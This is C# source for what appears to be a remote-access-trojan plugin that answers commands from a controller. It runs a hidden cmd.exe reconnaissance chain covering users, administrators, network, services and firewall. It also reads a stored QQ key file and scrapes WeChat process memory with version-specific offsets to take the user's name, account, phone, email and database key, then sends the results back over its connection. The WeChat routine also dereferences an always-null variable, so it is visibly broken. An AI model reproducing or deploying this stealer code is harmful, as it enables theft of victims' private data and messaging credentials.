using MessagePackLib.MessagePack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.DecodeFromBytes((byte[])data);
                string asString = msgPack.ForcePathObject("Pac_ket").AsString;
                if (!(asString == "information"))
                {
                    if (!(asString == "QQkey"))
                    {
                        if (asString == "wechat")
                        {
                            Connection.Send(wechat());
                        }
                    }
                    else
                    {
                        Connection.Send(QQkey());
                    }
                }
                else
                {
                    Connection.Send(InformationList());
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }
        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
        public static byte[] InformationList()
        {
            string back = execCMD(@"echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername & echo ####User Info#### & net user & echo ####Online User#### & query user & echo ####Local Group#### & net localgroup & echo ####Administrators Info#### & net localgroup administrators & echo ####Guest User Info#### & net user guest & echo ####Administrator User Info#### & net user administrator & echo ####Startup Info#### & wmic startup get caption,command & echo ####Tasklist#### & tasklist /svc & echo ####Ipconfig#### & ipconfig/all & echo ####Hosts#### & type C:\WINDOWS\System32\drivers\etc\hosts & echo ####Route Table#### & route print & echo ####Arp Info#### & arp -a & echo ####Netstat#### & netstat -ano & echo ####Service Info#### & sc query type= service state= all & echo ####Firewallinfo#### & netsh firewall show state & netsh firewall show config");
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Information";
            msgpack.ForcePathObject("ID").AsString = Connection.Hwid;
            msgpack.ForcePathObject("InforMation").AsString = back;
            return msgpack.Encode2Bytes();
        }

        public static byte[] QQkey()
        {
            string asString = File.ReadAllText("C:\\ProgramData\\QK.txt");
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "Information";
            msgPack.ForcePathObject("ID").AsString = Connection.Hwid;
            msgPack.ForcePathObject("InforMation").AsString = asString;
            return msgPack.Encode2Bytes();
        }
        public static byte[] wechat()
        {
            string asString = ReadTest();
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "Information";
            msgPack.ForcePathObject("ID").AsString = Connection.Hwid;
            msgPack.ForcePathObject("InforMation").AsString = asString;
            return msgPack.Encode2Bytes();
        }
        public static string execCMD(string command)
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
            process.StandardInput.WriteLine(command);
            process.StandardInput.WriteLine("exit");
            process.StandardInput.AutoFlush = true;
            string result = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            process.Close();
            return result;
        }
        private static string ReadTest()
        {
            List<int> list = null;
            Process WeChatProcess = null;
            string text = "";
            foreach (Process ProcessesName in Process.GetProcessesByName("WeChat"))
            {
                text = text + "[+] 微信进程PID: " + WeChatProcess.Id.ToString() + "\n";
                foreach (object obj in WeChatProcess.Modules)
                {
                    ProcessModule processModule = (ProcessModule)obj;
                    if (processModule.ModuleName == "WeChatWin.dll")
                    {
                        Packet.WeChatWinBaseAddress = processModule.BaseAddress;
                        string fileVersion = processModule.FileVersionInfo.FileVersion;
                        text = text + "[+] 微信客户端版本号: " + fileVersion + "\n";
                        if (!Packet.VersionList.TryGetValue(fileVersion, out list))
                        {
                            text = text + "[-] WeChat Current Version Is: " + fileVersion + " Not Support\n";
                            break;
                        }
                        break;
                    }
                }
                if (list == null)
                {
                    text += "[-] WeChat Base Address Get Faild\n";
                }
                else
                {
                    int value = (int)Packet.WeChatWinBaseAddress + list[4];
                    string hex = Packet.GetHex(WeChatProcess.Handle, (IntPtr)value);
                    if (string.IsNullOrWhiteSpace(hex))
                    {
                        text += "[-] WeChat Is Run, But Maybe No Login\n";
                    }
                    else
                    {
                        int value2 = (int)Packet.WeChatWinBaseAddress + list[0];
                        text = text + "[+] 微信名称: " + Packet.GetName(WeChatProcess.Handle, (IntPtr)value2, 100) + "\n";
                        int value3 = (int)Packet.WeChatWinBaseAddress + list[1];
                        if (string.IsNullOrWhiteSpace(Packet.GetMobile(WeChatProcess.Handle, (IntPtr)value3, 100)))
                        {
                            text += "[-] WeChatAccount: Maybe User Is No Set Account\n";
                        }
                        else
                        {
                            text = text + "[+] 微信号: " + Packet.GetAccount(WeChatProcess.Handle, (IntPtr)value3, 100) + "\n";
                        }
                        int value4 = (int)Packet.WeChatWinBaseAddress + list[2];
                        if (string.IsNullOrWhiteSpace(Packet.GetMobile(WeChatProcess.Handle, (IntPtr)value4, 100)))
                        {
                            text += "[-] WeChatMobile: Maybe User Is No Binding Mobile\n";
                        }
                        else
                        {
                            text = text + "[+] 手机号码: " + Packet.GetMobile(WeChatProcess.Handle, (IntPtr)value4, 100) + "\n";
                        }
                        int value5 = (int)Packet.WeChatWinBaseAddress + list[3];
                        if (!string.IsNullOrWhiteSpace(Packet.GetMail(WeChatProcess.Handle, (IntPtr)value5, 100)))
                        {
                            text = text + "[+] 微信邮箱: " + Packet.GetMail(WeChatProcess.Handle, (IntPtr)value5, 100) + "\n";
                        }
                        Console.WriteLine("[+] 微信Key: " + hex);
                        text = text + "[+] 微信Key: " + hex + "\n";
                    }
                }
            }
            return text;
        }

        private static string GetName(IntPtr hProcess, IntPtr lpBaseAddress, int nSize = 100)
        {
            byte[] array = new byte[nSize];
            if (Packet.ReadProcessMemory(hProcess, lpBaseAddress, array, nSize, 0) == 0)
            {
                return "";
            }
            string text = "";
            foreach (char c in Encoding.UTF8.GetString(array))
            {
                if (c == '\0')
                {
                    break;
                }
                text += c.ToString();
            }
            return text;
        }

        private static string GetAccount(IntPtr hProcess, IntPtr lpBaseAddress, int nSize = 100)
        {
            byte[] array = new byte[nSize];
            if (Packet.ReadProcessMemory(hProcess, lpBaseAddress, array, nSize, 0) == 0)
            {
                return "";
            }
            string text = "";
            foreach (char c in Encoding.UTF8.GetString(array))
            {
                if (c == '\0')
                {
                    break;
                }
                text += c.ToString();
            }
            return text;
        }


        private static string GetMobile(IntPtr hProcess, IntPtr lpBaseAddress, int nSize = 100)
        {
            byte[] array = new byte[nSize];
            if (Packet.ReadProcessMemory(hProcess, lpBaseAddress, array, nSize, 0) == 0)
            {
                return "";
            }
            string text = "";
            foreach (char c in Encoding.UTF8.GetString(array))
            {
                if (c == '\0')
                {
                    break;
                }
                text += c.ToString();
            }
            return text;
        }


        private static string GetMail(IntPtr hProcess, IntPtr lpBaseAddress, int nSize = 100)
        {
            byte[] array = new byte[nSize];
            if (Packet.ReadProcessMemory(hProcess, lpBaseAddress, array, nSize, 0) == 0)
            {
                return "";
            }
            string text = "";
            foreach (char c in Encoding.UTF8.GetString(array))
            {
                if (c == '\0')
                {
                    break;
                }
                text += c.ToString();
            }
            return text;
        }


        private static string GetHex(IntPtr hProcess, IntPtr lpBaseAddress)
        {
            byte[] array = new byte[4];
            if (Packet.ReadProcessMemory(hProcess, lpBaseAddress, array, 4, 0) == 0)
            {
                return "";
            }
            int num = 32;
            byte[] array2 = new byte[num];
            IntPtr lpBaseAddress2 = (IntPtr)(((int)array[3] << 24) + ((int)array[2] << 16) + ((int)array[1] << 8) + (int)array[0]);
            if (Packet.ReadProcessMemory(hProcess, lpBaseAddress2, array2, num, 0) == 0)
            {
                return "";
            }
            return Packet.bytes2hex(array2);
        }


        private static string bytes2hex(byte[] bytes)
        {
            return BitConverter.ToString(bytes, 0).Replace("-", string.Empty).ToLower().ToUpper();
        }

        [DllImport("kernel32.dll")]
        public static extern int OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);


        [DllImport("kernel32.dll")]
        public static extern int GetModuleHandleA(string moduleName);
        [DllImport("kernel32.dll")]
        public static extern int ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, int lpNumberOfBytesRead);

        public static Dictionary<string, List<int>> VersionList = new Dictionary<string, List<int>>
        {
            {
                "3.2.1.154",
                new List<int>
                {
                    328121948,
                    328122328,
                    328123056,
                    328121976,
                    328123020
                }
            },
            {
                "3.3.0.115",
                new List<int>
                {
                    31323364,
                    31323744,
                    31324472,
                    31323392,
                    31324436
                }
            },
            {
                "3.3.0.84",
                new List<int>
                {
                    31315212,
                    31315592,
                    31316320,
                    31315240,
                    31316284
                }
            },
            {
                "3.3.0.93",
                new List<int>
                {
                    31323364,
                    31323744,
                    31324472,
                    31323392,
                    31324436
                }
            },
            {
                "3.3.5.34",
                new List<int>
                {
                    30603028,
                    30603408,
                    30604120,
                    30603056,
                    30604100
                }
            },
            {
                "3.3.5.42",
                new List<int>
                {
                    30603012,
                    30603392,
                    30604120,
                    30603040,
                    30604084
                }
            },
            {
                "3.3.5.46",
                new List<int>
                {
                    30578372,
                    30578752,
                    30579480,
                    30578400,
                    30579444
                }
            },
            {
                "3.4.0.37",
                new List<int>
                {
                    31608116,
                    31608496,
                    31609224,
                    31608144,
                    31609188
                }
            },
            {
                "3.4.0.38",
                new List<int>
                {
                    31604044,
                    31604424,
                    31605152,
                    31604072,
                    31605116
                }
            },
            {
                "3.4.0.50",
                new List<int>
                {
                    31688500,
                    31688880,
                    31689608,
                    31688528,
                    31689572
                }
            },
            {
                "3.4.0.54",
                new List<int>
                {
                    31700852,
                    31701248,
                    31700920,
                    31700880,
                    31701924
                }
            },
            {
                "3.4.5.27",
                new List<int>
                {
                    32133788,
                    32134168,
                    32134896,
                    32133816,
                    32134860
                }
            },
            {
                "3.4.5.45",
                new List<int>
                {
                    32147012,
                    32147392,
                    32147064,
                    32147040,
                    32148084
                }
            },
            {
                "3.5.0.20",
                new List<int>
                {
                    35494484,
                    35494864,
                    35494536,
                    35494512,
                    35495556
                }
            },
            {
                "3.5.0.29",
                new List<int>
                {
                    35507980,
                    35508360,
                    35508032,
                    35508008,
                    35509052
                }
            },
            {
                "3.5.0.33",
                new List<int>
                {
                    35512140,
                    35512520,
                    35512192,
                    35512168,
                    35513212
                }
            },
            {
                "3.5.0.39",
                new List<int>
                {
                    35516236,
                    35516616,
                    35516288,
                    35516264,
                    35517308
                }
            },
            {
                "3.5.0.42",
                new List<int>
                {
                    35512140,
                    35512520,
                    35512192,
                    35512168,
                    35513212
                }
            },
            {
                "3.5.0.44",
                new List<int>
                {
                    35510836,
                    35511216,
                    35510896,
                    35510864,
                    35511908
                }
            },
            {
                "3.5.0.46",
                new List<int>
                {
                    35506740,
                    35507120,
                    35506800,
                    35506768,
                    35507812
                }
            },
            {
                "3.6.0.18",
                new List<int>
                {
                    35842996,
                    35843376,
                    35843048,
                    35843024,
                    35844068
                }
            },
            {
                "3.6.5.7",
                new List<int>
                {
                    35864356,
                    35864736,
                    35864408,
                    35864384,
                    35865428
                }
            },
            {
                "3.6.5.16",
                new List<int>
                {
                    35909428,
                    35909808,
                    35909480,
                    35909456,
                    35910500
                }
            },
            {
                "3.7.0.26",
                new List<int>
                {
                    37105908,
                    37106288,
                    37105960,
                    37105936,
                    37106980
                }
            },
            {
                "3.7.0.29",
                new List<int>
                {
                    37105908,
                    37106288,
                    37105960,
                    37105936,
                    37106980
                }
            },
            {
                "3.7.0.30",
                new List<int>
                {
                    37118196,
                    37118576,
                    37118248,
                    37118224,
                    37119268
                }
            },
            {
                "3.7.5.11",
                new List<int>
                {
                    37883280,
                    37884088,
                    37883136,
                    37883008,
                    37884052
                }
            },
            {
                "3.7.5.23",
                new List<int>
                {
                    37895736,
                    37896544,
                    37895592,
                    37883008,
                    37896508
                }
            },
            {
                "3.7.5.27",
                new List<int>
                {
                    37895736,
                    37896544,
                    37895592,
                    37895464,
                    37896508
                }
            },
            {
                "3.7.5.31",
                new List<int>
                {
                    37903928,
                    37904736,
                    37903784,
                    37903656,
                    37904700
                }
            },
            {
                "3.7.6.24",
                new List<int>
                {
                    38978840,
                    38979648,
                    38978696,
                    38978604,
                    38979612
                }
            },
            {
                "3.7.6.29",
                new List<int>
                {
                    38986376,
                    38987184,
                    38986232,
                    38986104,
                    38987148
                }
            },
            {
                "3.7.6.44",
                new List<int>
                {
                    39016520,
                    39017328,
                    39016376,
                    38986104,
                    39017292
                }
            },
            {
                "3.8.0.31",
                new List<int>
                {
                    46064088,
                    46064912,
                    46063944,
                    38986104,
                    46064876
                }
            },
            {
                "3.8.0.33",
                new List<int>
                {
                    46059992,
                    46060816,
                    46059848,
                    38986104,
                    46060780
                }
            },
            {
                "3.8.0.41",
                new List<int>
                {
                    46064024,
                    46064848,
                    46063880,
                    38986104,
                    46064812
                }
            },
            {
                "3.8.1.26",
                new List<int>
                {
                    46409448,
                    46410272,
                    46409304,
                    38986104,
                    46410236
                }
            }
        };


        private static IntPtr WeChatWinBaseAddress = IntPtr.Zero;
    

}

}